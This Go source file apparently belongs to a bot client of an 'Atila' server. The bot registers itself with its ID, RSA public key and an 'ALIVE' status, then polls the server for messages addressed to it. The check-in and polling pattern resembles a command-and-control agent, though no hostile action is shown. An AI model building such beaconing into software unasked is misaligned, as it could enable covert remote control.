package main

import (
	"bytes"
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"net/http"
)

type Message struct {
	Id      string `json:"id"`      // Unique identifier.
	From    string `json:"from"`    // Node which originally issued the message.
	To      string `json:"to"`      // Which node should receive message.
	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
	Content string `json:"content"` // Base64 encoded data.
	Status  string `json:"status"`  // Message's state.
	ReplyTo string `json:"replyTo"` // Original message ID.
}

// identifyPayload is a structure corresponding to Atila's bot identification endpoint.
type identifyPayload struct {
	Id        string `json:"id"`        // UUID of the bot. (self-generated)
	PublicKey string `json:"publicKey"` // Public key of the bot.
	Status    string `json:"status"`    // Bot's status.
}

// identify makes the bot known to the Atila server. Returns true if identification was successful.
func identify(id string, publicKey *rsa.PublicKey) bool {
	// Bot's identification details which will be stored in the Atila's database.
	details := identifyPayload{
		Id:        id,
		PublicKey: publicKeyToPEM(publicKey),
		Status:    "ALIVE",
	}

	detailsJson, err := json.Marshal(details)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}

	request, err := http.NewRequest("POST", atilaHost+"/v1/clients", bytes.NewBuffer(detailsJson))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer request.Body.Close()

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer response.Body.Close()

	// Any status code other than 200 is a failure.
	if response.StatusCode != 200 {
		fmt.Println("Identification failed with status code: " + fmt.Sprint(response.StatusCode))
		return false
	}

	return true
}

// inboxReader is a loop of fetching and interpreting messages.
// Returns true if the operation was successful, false if it didn't.
func inboxReader(id string) bool {
	response, err := http.Get(atilaHost + "/v1/messages?clientId=" + id)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer response.Body.Close()

	jsonDecoder := json.NewDecoder(response.Body)
	jsonDecoder.DisallowUnknownFields()

	var maybeMessages []Message

	jsonErr := jsonDecoder.Decode(&maybeMessages)
	if jsonErr != nil {
		fmt.Println(jsonErr.Error())
		return false
	}

	return true
}
